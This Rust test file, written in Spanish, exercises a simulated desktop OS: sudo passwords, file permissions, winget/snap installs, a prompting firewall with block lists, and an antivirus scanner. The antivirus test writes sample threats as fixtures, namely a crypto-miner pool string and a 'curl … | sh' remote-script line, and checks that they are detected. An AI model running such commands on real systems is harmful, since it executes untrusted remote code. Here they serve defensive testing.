    t.d.proc_event(ProcEvent::Exited {
        pid: spawn[0].pid,
        code: 0,
        why: None,
    });
    assert!(fatfs_exists(t.d, "/Papelera/k11.txt"));
}

#[test]
fn instalar_abre_la_configuracion_de_hardware() {
    let mut t = Driver::new();
    open_terminal(&mut t);
    let out = run(&mut t, "instalar");
    assert!(out.contains("disco vacío"), "{out}");
    let Some(App::Settings(s)) = t.d.app(AppKind::Settings) else {
        panic!("no se abrió Configuración");
    };
    assert_eq!(s.section.name(), "Hardware");
}

/// ADR 0020: usuarios, `sudo` con contraseña, `su`, `chmod`, `chown` y permisos que se respetan.
#[test]
fn sudo_pide_la_contrasena_y_los_permisos_se_respetan() {
    let mut t = Driver::new();
    open_terminal(&mut t);
    // Sin contraseña configurada, sudo anda directo (como NOPASSWD). Se define una con passwd.
    let out = run(&mut t, "passwd");
    assert!(out.contains("Nueva contraseña"), "{out}");
    let out = run(&mut t, "clave1234");
    assert!(out.contains("otra vez") || out.contains("Vuelva"), "{out}");
    // Lo que se tipea no aparece en la pantalla.
    assert!(!screen(&t).contains("clave1234"));
    let out = run(&mut t, "clave1234");
    assert!(out.contains("actualizada"), "{out}");
    t.frame();

    // apt sin sudo: el error de Debian.
    let out = run(&mut t, "apt install hola");
    assert!(out.contains("superusuario"), "{out}");
    // Escribir en las carpetas del sistema: Permiso denegado.
    let out = run(&mut t, "touch /Programas/x.txt");
    assert!(out.contains("Permiso denegado"), "{out}");
    let out = run(&mut t, "echo hola > /Sistema/prueba.txt");
    assert!(out.contains("Permiso denegado"), "{out}");
    let out = run(&mut t, "cat /Sistema/config.ini");
    assert!(out.contains("Permiso denegado"), "{out}");

    // sudo pide la contraseña: mal tres veces, se rinde.
    let out = run(&mut t, "sudo touch /Programas/x.txt");
    assert!(out.contains("[sudo] contraseña para roman"), "{out}");
    assert!(run(&mut t, "mala").contains("probá otra vez"));
    assert!(run(&mut t, "mala2").contains("probá otra vez"));
    assert!(run(&mut t, "mala3").contains("3 intentos"));
    assert!(!fatfs_exists_in(&mut t, "/Programas/x.txt"));
    // Bien: corre como root, y no la vuelve a pedir enseguida.
    run(&mut t, "sudo whoami");
    let out = run(&mut t, "clave1234");
    assert!(out.contains("root"), "{out}");
    let out = run(
        &mut t,
        "sudo mkdir -p /Programas && sudo touch /Programas/x.txt && whoami",
    );
    assert!(!out.contains("contraseña"), "{out}");
    assert!(out.contains("roman"), "{out}");
    assert!(fatfs_exists_in(&mut t, "/Programas/x.txt"));
    let out = run(&mut t, "ls -l /Programas");
    assert!(out.contains("-rw-r--r-- 1 root  root"), "{out}");
    assert!(run(&mut t, "sudo grep usuario /Sistema/config.ini").contains("usuario="));
    // sudo -k olvida la contraseña.
    run(&mut t, "sudo -k");
    assert!(run(&mut t, "sudo -l").contains("[sudo] contraseña"));
    assert!(run(&mut t, "clave1234").contains("(ALL : ALL) ALL"));

    // chmod: un script sin x no se ejecuta; con +x, sí.
    run(&mut t, "cd /Documentos");
    run(&mut t, "echo 'echo hola desde el script' > saludo.sh");
    let out = run(&mut t, "./saludo.sh");
    assert!(out.contains("Permiso denegado"), "{out}");
    assert!(run(&mut t, "sh saludo.sh").contains("hola desde el script"));
    assert!(!run(&mut t, "chmod +x saludo.sh").contains("chmod:"));
    assert!(run(&mut t, "ls -l saludo.sh").contains("-rwxr-xr-x"));
    assert!(run(&mut t, "./saludo.sh").contains("hola desde el script"));
    assert!(run(&mut t, "stat saludo.sh").contains("(0755/-rwxr-xr-x)"));
    run(&mut t, "chmod 600 notas.txt");
    assert!(run(&mut t, "ls -l notas.txt").contains("-rw-------"));
    assert!(run(&mut t, "chmod u*x notas.txt").contains("modo inválido"));
    // Los archivos de root solo los cambia root.
    let out = run(&mut t, "chmod 777 /Programas/x.txt");
    assert!(out.contains("Operación no permitida"), "{out}");
    let out = run(&mut t, "chown root notas.txt");
    assert!(out.contains("Operación no permitida"), "{out}");
    run(&mut t, "sudo chown root:sudo notas.txt");
    assert!(run(&mut t, "ls -l notas.txt").contains("root  sudo"));
    // Mover lleva los permisos.
    run(&mut t, "mv saludo.sh /Proyectos/");
    assert!(run(&mut t, "ls -l /Proyectos/saludo.sh").contains("-rwxr-xr-x"));
    // Quedan en el disco.
    let db = fatfs_read_in(&mut t, "/Sistema/permisos.db").expect("permisos.db");
    let db = String::from_utf8_lossy(&db);
    assert!(db.contains("0755 1000 1000 /proyectos/saludo.sh"), "{db}");

    // su: terminal de root hasta exit.
    let out = run(&mut t, "su");
    assert!(out.contains("Contraseña"), "{out}");
    run(&mut t, "clave1234");
    // El prompt pasa a ser el de root (con #).
    assert!(run(&mut t, "whoami").contains("root@jarvis:/Documentos# whoami\nroot"));
    assert!(run(&mut t, "id").contains("uid=0(root)"));
    run(&mut t, "exit");
    assert!(run(&mut t, "id").contains("uid=1000(roman)"));
    assert!(
        t.d.app(AppKind::Terminal).is_some(),
        "exit en root no cierra la terminal"
    );

    // Los programas de Linux corren como el usuario, o como root con sudo.
    run(&mut t, "sudo apt install programas-linux");
    t.type_text("sudo hola-linux");
    t.key(Key::Enter);
    let reqs = t.d.take_requests();
    assert_eq!(reqs.spawn.last().map(|s| s.uid), Some(0));
}

/// ADR 0021: `winget install` instala un paquete `zip` con un programa "portable" adentro
/// (verifica el SHA-256 del manifiesto), deja el comando y lo corre con vino.
#[test]
fn winget_instala_un_zip_portable_y_lo_corre_con_vino() {
    let mut t = Driver::new();
    open_terminal(&mut t);
    let manifest = "http://paquetes.jarvis/winget/Jarvis.HolaWin.installer.yaml";
    // Sin sudo, no.
    let out = run(&mut t, &format!("winget install --manifest {manifest}"));
    assert!(out.contains("permisos de administrador"), "{out}");
    let out = run(
        &mut t,
        &format!("sudo winget install --manifest {manifest}"),
    );
    assert!(out.contains("SHA-256 verificado"), "{out}");
    assert!(out.contains("Instalado Jarvis.HolaWin 1.0.0"), "{out}");
    assert!(out.contains("Comando:"), "{out}");
    assert!(
        out.contains("sudo apt install vino"),
        "sin vino, dice cómo conseguirlo: {out}"
    );
    assert!(fatfs_exists_in(
        &mut t,
        "/Programas/windows/Jarvis.HolaWin/hola-win-1.0/hola-win.exe"
    ));
    assert!(fatfs_exists_in(
        &mut t,
        "/Programas/windows/Jarvis.HolaWin/hola-win-1.0/LEAME.txt"
    ));
    assert!(
        t.logs()
            .iter()
            .any(|l| l == "WINGET_INSTALADO Jarvis.HolaWin hola-win")
    );
    let out = run(&mut t, "winget list");
    assert!(out.contains("Jarvis.HolaWin"), "{out}");
    assert!(out.contains("hola-win"), "{out}");

    // Con vino, el comando lo corre: `hola-win uno` → vino …/hola-win.exe uno.
    run(&mut t, "sudo apt install vino");
    t.type_text("hola-win uno");
    t.key(Key::Enter);
    let reqs = t.d.take_requests();
    let sp = reqs
        .spawn
        .last()
        .unwrap_or_else(|| panic!("{}", screen(&t)));
    assert_eq!(sp.path, "/Programas/bin/vino");
    assert_eq!(
        sp.argv,
        [
            "vino",
            "/Programas/windows/Jarvis.HolaWin/hola-win-1.0/hola-win.exe",
            "uno"
        ]
    );
    t.d.proc_event(jarvis_desktop::procs::ProcEvent::Exited {
        pid: sp.pid,
        code: 0,
        why: None,
    });

    // Desinstalar: a la Papelera.
    let out = run(&mut t, "sudo winget uninstall Jarvis.HolaWin");
    assert!(out.contains("Papelera"), "{out}");
    assert!(!fatfs_exists_in(&mut t, "/Programas/bin/hola-win"));
    assert!(!fatfs_exists_in(
        &mut t,
        "/Programas/windows/Jarvis.HolaWin"
    ));
    assert!(!run(&mut t, "winget list").contains("Jarvis.HolaWin"));
}

/// Un `.snap` de verdad (squashfs con xz, armado con `backhand`) con un programa de Linux.
fn tiny_snap() -> Vec<u8> {
    use backhand::{FilesystemWriter, NodeHeader};
    let h = |mode| NodeHeader {
        permissions: mode,
        uid: 0,
        gid: 0,
        mtime: 0,
    };
    let yaml = "name: hola\nversion: '1.0'\nsummary: Hola de prueba\nbase: core22\n\
                confinement: strict\napps:\n  hola:\n    command: bin/hola\n  saludo:\n\
                \x20   command: bin/hola -g $SAY\n    environment:\n      SAY: Hola, mundo\n";
    let mut w = FilesystemWriter::default();
    w.push_dir("meta", h(0o755)).unwrap();
    w.push_dir("bin", h(0o755)).unwrap();
    w.push_dir("usr", h(0o755)).unwrap();
    w.push_dir("usr/bin", h(0o755)).unwrap();
    w.push_file(
        std::io::Cursor::new(yaml.as_bytes().to_vec()),
        "meta/snap.yaml",
        h(0o644),
    )
    .unwrap();
    w.push_file(std::io::Cursor::new(tiny_elf(None)), "bin/hola", h(0o755))
        .unwrap();
    w.push_symlink("../../bin/hola", "usr/bin/hola-enlace", h(0o777))
        .unwrap();
    let mut out = std::io::Cursor::new(Vec::new());
    w.write(&mut out).unwrap();
    out.into_inner()
}

/// ADR 0021: `snap install --dangerous` desarma un squashfs de verdad en /snap/<nombre>/<rev>,
/// deja un lanzador por app y el programa corre con las variables del snap.
#[test]
fn snap_instala_un_squashfs_de_verdad() {
    let mut t = Driver::new();
    open_terminal(&mut t);
    t.d.fs_mut()
        .unwrap()
        .write_file(
            "/Documentos/hola_1.snap",
            &tiny_snap(),
            jarvis_fs::Timestamp::EPOCH,
        )
        .unwrap();
    assert!(run(&mut t, "file /Documentos/hola_1.snap").contains("squashfs"));
    let out = run(&mut t, "snap install /Documentos/hola_1.snap");
    assert!(out.contains("acceso denegado"), "{out}");
    let out = run(&mut t, "sudo snap install /Documentos/hola_1.snap");
    assert!(out.contains("--dangerous"), "{out}");
    let out = run(
        &mut t,
        "sudo snap install --dangerous /Documentos/hola_1.snap",
    );
    assert!(out.contains("hola 1.0"), "{out}");
    assert!(out.contains("Comandos: hola, hola.saludo"), "{out}");
    assert!(out.contains("sudo apt install libc6"), "{out}");
    assert!(fatfs_exists_in(&mut t, "/snap/hola/1/bin/hola"));
    assert!(fatfs_exists_in(&mut t, "/snap/hola/1/meta/snap.yaml"));
    // El enlace se copió (FAT32 no tiene enlaces).
    let link = fatfs_read_in(&mut t, "/snap/hola/1/usr/bin/hola-enlace").unwrap();
    assert!(link.starts_with(b"\x7fELF"));
    assert!(t.logs().iter().any(|l| l == "SNAP_INSTALADO hola 1.0 1"));
    assert!(run(&mut t, "snap list").contains("hola"));

    // `hola.saludo uno` → el programa con los argumentos de su `command` y las variables.
    t.type_text("hola.saludo uno");
    t.key(Key::Enter);
    let reqs = t.d.take_requests();
    let sp = reqs
        .spawn
        .last()
        .unwrap_or_else(|| panic!("{}", screen(&t)));
    assert_eq!(sp.path, "/snap/hola/1/bin/hola");
    assert_eq!(
        sp.argv,
        ["/snap/hola/1/bin/hola", "-g", "Hola, mundo", "uno"]
    );
    assert!(
        sp.envp.contains(&"SNAP=/snap/hola/1".to_string()),
        "{:?}",
        sp.envp
    );
    assert!(sp.envp.contains(&"SNAP_REVISION=1".to_string()));
    assert!(sp.envp.contains(&"SAY=Hola, mundo".to_string()));
    assert!(
        sp.envp
            .iter()
            .any(|v| v.starts_with("LD_LIBRARY_PATH=/snap/hola/1/lib"))
    );
    assert_eq!(sp.uid, 1000);
    t.d.proc_event(jarvis_desktop::procs::ProcEvent::Exited {
        pid: sp.pid,
        code: 0,
        why: None,
    });

    // Desinstalar saca los dos lanzadores.
    let out = run(&mut t, "sudo snap remove hola");
    assert!(out.contains("Papelera"), "{out}");
    assert!(!fatfs_exists_in(&mut t, "/snap/bin/hola"));
    assert!(!fatfs_exists_in(&mut t, "/snap/bin/hola.saludo"));
}

/// ADR 0024: el firewall pregunta (como OpenSnitch), usa listas de bloqueo y anota las
/// conexiones (como Portmaster).
#[test]
fn firewall_pregunta_listas_y_conexiones() {
    let mut t = Driver::new();
    open_terminal(&mut t);
    assert!(run(&mut t, "sudo ufw default ask outgoing").contains("preguntar"));
    // Una conexión nueva: el pedido queda esperando y aparece el diálogo.
    t.type_text("wget http://example.com/");
    t.key(Key::Enter);
    let reqs = t.d.take_requests();
    assert!(reqs.net.iter().all(|r| !r.url.contains("example.com")));
    assert_eq!(t.d.overlay_name(), "firewall");
    assert!(
        t.logs()
            .iter()
            .any(|l| l == "FIREWALL_PREGUNTA terminal example.com")
    );
    // Enter = permitir (esta sesión): el pedido sale (y wget termina).
    t.key(Key::Enter);
    assert_eq!(t.d.overlay_name(), "");
    assert!(
        t.logs()
            .iter()
            .any(|l| l == "FIREWALL_RESPUESTA permitir terminal example.com")
    );
    serve(&mut t);
    // Llegó a la "red" del test (sin el firewall en el medio).
    assert!(screen(&t).contains("sin red en el test"), "{}", screen(&t));
    // La segunda vez no pregunta.
    let out = run(&mut t, "wget http://example.com/otra");
    assert_eq!(t.d.overlay_name(), "");
    assert!(out.contains("sin red en el test"), "{out}");

    // Otro sitio: "denegar siempre" crea una regla.
    t.type_text("wget http://rastreador.example/");
    t.key(Key::Enter);
    assert_eq!(t.d.overlay_name(), "firewall");
    t.key(Key::Right);
    t.key(Key::Right);
    t.key(Key::Enter);
    serve(&mut t);
    let out = run(&mut t, "ufw status");
    assert!(out.contains("rastreador.example"), "{out}");
    assert!(out.contains("DENY OUT"), "{out}");

    // Listas de bloqueo: se bajan, quedan activas y bloquean.
    run(&mut t, "sudo ufw default allow outgoing");
    let out = run(&mut t, "sudo ufw listas actualizar urlhaus");
    assert!(out.contains("Lista urlhaus: 2 dominios"), "{out}");
    let out = run(&mut t, "ufw listas");
    assert!(out.contains("urlhaus") && out.contains("sí"), "{out}");
    let out = run(&mut t, "wget http://www.malo.example/");
    assert!(out.contains("lista de bloqueo urlhaus"), "{out}");
    // Sin sudo no se tocan.
    assert!(run(&mut t, "ufw listas desactivar urlhaus").contains("root"));
    // El registro de conexiones.
    t.d.set_stats(jarvis_desktop::SystemStats::default());
    let out = run(&mut t, "ufw show conexiones");
    assert!(
        out.contains("www.malo.example") && out.contains("BLOQUEADA"),
        "{out}"
    );
    assert!(
        out.contains("example.com") && out.contains("permitida"),
        "{out}"
    );
}

/// ADR 0024: reglas tipo YARA (las de severidad alta mandan a cuarentena; las de media
/// avisan), heurística y firmas de ClamAV.
#[test]
fn antivirus_con_reglas_heuristica_y_clamav() {
    let mut t = Driver::new();
    open_terminal(&mut t);
    let out = run(&mut t, "antivirus reglas");
    assert!(
        out.contains("Minero_de_criptomonedas") && out.contains("alta"),
        "{out}"
    );
    assert!(run(&mut t, "antivirus").contains("Reglas: 7"));
    let fs = t.d.fs_mut().unwrap();
    let ts = jarvis_fs::Timestamp::EPOCH;
    fs.write_file(
        "/Documentos/minero.txt",
        b"pool: stratum+tcp://pool.example:3333 --donate-level 1",
        ts,
    )
    .unwrap();
    fs.write_file(
        "/Documentos/instalar.sh",
        b"curl -fsSL http://example.com/x.sh | sh\n",
        ts,
    )
    .unwrap();
    fs.write_file(
        "/Documentos/firmado.txt",
        b"un archivo marcado por ClamAV",
        ts,
    )
    .unwrap();
    let out = run(&mut t, "antivirus analizar /Documentos/minero.txt");
    assert!(
        out.contains("AMENAZA") && out.contains("Minero_de_criptomonedas"),
        "{out}"
    );
    // ClamAV: el SHA-256 de firmado.txt.
    let h = run(&mut t, "antivirus analizar /Documentos/firmado.txt");
    let sha = h.split("SHA-256 ").nth(1).unwrap()[..64].to_string();
    t.d.fs_mut()
        .unwrap()
        .write_file(
            "/Documentos/firmas.hsb",
            format!("{sha}:29:Prueba.Firmado-1\n").as_bytes(),
            ts,
        )
        .unwrap();
    assert!(run(&mut t, "antivirus importar /Documentos/firmas.hsb").contains("1 firmas nuevas"));
    let out = run(&mut t, "antivirus escanear /Documentos");
    assert!(
        out.contains("minero.txt") && out.contains("regla Minero_de_criptomonedas"),
        "{out}"
    );
    assert!(
        out.contains("firmado.txt") && out.contains("malware conocido"),
        "{out}"
    );
    // El script solo es sospechoso: se avisa y queda donde estaba.
    assert!(out.contains("instalar.sh: sospechoso"), "{out}");
    assert!(fatfs_exists_in(&mut t, "/Documentos/instalar.sh"));
    assert!(!fatfs_exists_in(&mut t, "/Documentos/minero.txt"));
    assert!(run(&mut t, "antivirus cuarentena").contains("minero.txt"));
    // MD5 de ClamAV (.hdb): no se importa.
    t.d.fs_mut()
        .unwrap()
        .write_file(
            "/Documentos/viejas.hdb",
            b"44d88612fea8a8f36de82e1278abb02f:68:X\n",
            ts,
        )
        .unwrap();
    assert!(run(&mut t, "antivirus importar /Documentos/viejas.hdb").contains("SHA-256"));
}
